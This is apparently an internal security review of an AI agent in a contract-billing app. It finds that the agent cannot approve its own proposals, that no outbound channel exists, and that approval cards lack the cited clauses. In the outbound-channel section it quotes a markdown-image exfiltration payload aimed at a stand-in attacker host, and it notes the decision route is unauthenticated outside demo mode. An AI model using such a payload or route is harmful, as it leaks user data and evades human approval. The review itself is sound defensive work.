# S8: Rule of Two / lethal trifecta, human approval (ASI09)

Date 2026-10-17. Method: manual code reading at commit `707ed2e`, no tool and no run. Target: `backend/app`,
`frontend/src`. Checklist from `artifacts/2026-10-16-security-review-decisions.md`, section 3 and the S8 row.
Screenshots: none taken (optional).

## Result: 2 pass, 1 partial

| # | Check | Verdict |
|---|---|---|
| 1 | The approval screen shows deterministic amounts and cited clauses, not model prose | **Partial** (amounts pass, clauses not on the card) |
| 2 | The agent cannot approve its own proposal | **Pass** |
| 3 | No outbound channel in tools or rendering | **Pass** |

## 1. The approval screen shows deterministic amounts and cited clauses, not model prose: partial

**Amounts are computed in code, not by the model: pass.**
- The model chooses only `document_id` and `as_of`. The gap comes from
  `compare_contract_to_billing` (`backend/app/contracts/compare.py:58`, using `billing/fee_math.py`).
- The entries are built by code from that result: a debit and a credit of the same `annual_gap_minor`
  (`backend/app/assistant/contract_tools.py:80-85`).
- The invocation row stores `result_amount_minor` and `proposed_entries` from the tool's outcome, never from model
  text (`backend/app/assistant/tools.py:159-170`).

**The card shows no model prose: pass.**
- `ApprovalCard` renders the tool label, `result_amount_minor`, the model id, the session, the time, and the
  entries table (account name from the ledger, debit/credit from `proposed_entries`)
  (`frontend/src/components/ApprovalCard.tsx:21-25`, `54-91`).
- No answer text reaches the card.
- The account labels are read from the ledger (`backend/app/routes/tool_invocations.py:60-67`).

**Cited clauses are not on the card: gap.**
- The API returns `citation` (`{"ids": [...]}`, `tool_invocations.py:54`, `tools.py:168`), but the card does not
  render it. The card also does not show which contract it is about, or the `as_of` date.
- In Chat, the clauses are visible only as the citation cards of the answer above
  (`frontend/src/screens/Chat.tsx:246-251`), next to the model prose.
- On the Review screen, "Show contract" opens the document at no particular page
  (`approvalTarget`, `page: null`).
- So an approver can approve without seeing the clause that justifies the amount.
- Severity: **Medium** (ASI09, human trust in the agent). Nothing is posted in the public demo: the approval goes
  to the guest's overlay (`backend/app/governance/dao.py:183-197`).
- **Proposed fix:** render the contract title, `as_of`, and the quote and page of each `citation.ids` element on
  the card (the API already has the ids; resolve them with the same lookup `_element_sources` uses), and point
  "Show contract" at the first cited page.

## 2. The agent cannot approve its own proposal: pass

- The agent's tools are the five in `default_tools() + contract_tools()` (`backend/app/assistant/runtime.py:30`;
  `tools.py:138-143`, `contract_tools.py:88-94`). None of them decides.
- The graph runs only tools listed by name, and refuses any other name (`backend/app/assistant/graph.py:190-193`).
- No module under `backend/app/assistant`, `contracts` or `retrieval` imports `governance.dao.decide`. The
  assistant uses only `record_invocation`, `ModelConfig` and `purge_guest_decisions`.
- A decision is made only through `POST /tool-invocations/{id}/decision`
  (`backend/app/routes/tool_invocations.py:112-123`), so it needs an HTTP request from a client.
- A decision is recorded once: `AlreadyDecided` on the primary key (`governance/dao.py:163-179`).
- In demo mode it needs a known guest, and only that guest's own proposal
  (`governance/dao.py:155-158`, `backend/app/deps.py:59-65`).
- **Note (not an agent bypass): there is no authentication outside demo mode.**
  - The acting user is fixed (`backend/app/deps.py:16`), and the decision route is mounted in every mode
    (`backend/app/main.py:45-47`).
  - With `DEMO_MODE` off, any client that can reach the API can approve, and approving posts to the ledger.
  - The public demo runs with `DEMO_MODE` on, so its approvals change only the guest's overlay.
  - Already tracked as "authentication not built". Restate it with S5.

## 3. No outbound channel in tools or rendering: pass

**Tools.**
- None of the five tools fetches a URL, sends mail, calls a webhook or runs code (`tools.py:86-143`,
  `contract_tools.py:47-94`).
- `backend/app` imports no `httpx`, `requests`, `urllib`, `aiohttp`, `smtplib` or `subprocess` (grep, 0 hits).
- The only network clients are fixed SDKs (OpenAI, Pinecone, Langfuse, Sentry), and their hosts come from config,
  never from model output.

**Rendering.**
- Answers render through `Markdown` (`frontend/src/screens/Chat.tsx:246`, `259`, `265`). It is a home-made subset
  with paragraphs, lists, headings and bold only; there are **no links or images**
  (`frontend/src/lib/markdown.ts:1`, `27`; `frontend/src/components/Markdown.tsx:7-14`).
- The text is placed as React text nodes, so it is escaped.
- `dangerouslySetInnerHTML` and `innerHTML` appear 0 times in `frontend/src`.
- Citation quotes render as text (`Chat.tsx:71`). The open button builds a viewer target from ids, not from a URL
  the model supplied.
- So the markdown-image exfiltration channel (`![](https://attacker/?q=...)`) does not exist.
- Correction to `2026-10-16-security-review-decisions.md` section 3: answers are no longer "plain text, no markdown
  renderer". They go through this link-free subset, so the conclusion still holds.

**Other links.**
- The links that exist come from code: the trace link from `LANGFUSE_URL` plus a server trace id
  (`frontend/src/components/workspace/AuditLog.tsx:60`), document pages from ids
  (`DocumentViewer.tsx:107`, `ContractProfile.tsx:84`), and the landing page constants.

**Untrusted PDFs in the browser.**
- They render through `pdfjs-dist` 6.3.289 (`frontend/package-lock.json:1685-1686`), which is past the
  CVE-2024-4367 fix (4.2.67). Not an outbound channel.

## Rule of Two, as built

| Property | Holds? | Evidence |
|---|---|---|
| A. Untrusted input | Yes | guest chat; third-party contracts (EDGAR) in search hits |
| B. Sensitive data | Yes | contracts and billing; PII tokenised before tool arguments (`tools.py:153-157`) |
| C. State change or outbound | **Gated** | state change only proposed and decided over HTTP by a person (check 2); no outbound channel (check 3) |

The lethal trifecta is not complete: there is no exfiltration channel. If the model is fooled, the worst outcome is
a wrong answer, or a wrong proposal that a person sees with computed amounts. Check 1's gap is that the person does
not see the clause beside that amount.

## Left, with plan

| Item | Severity | Plan |
|---|---|---|
| Cited clauses, contract and `as_of` missing from the approval card | Medium | Render them on the card (fix above). Small frontend change plus a citation lookup in the list route |
| No authentication on the decision route outside demo mode | Context (known gap) | Authenticated principal before any non-demo deployment; restate with S5 |
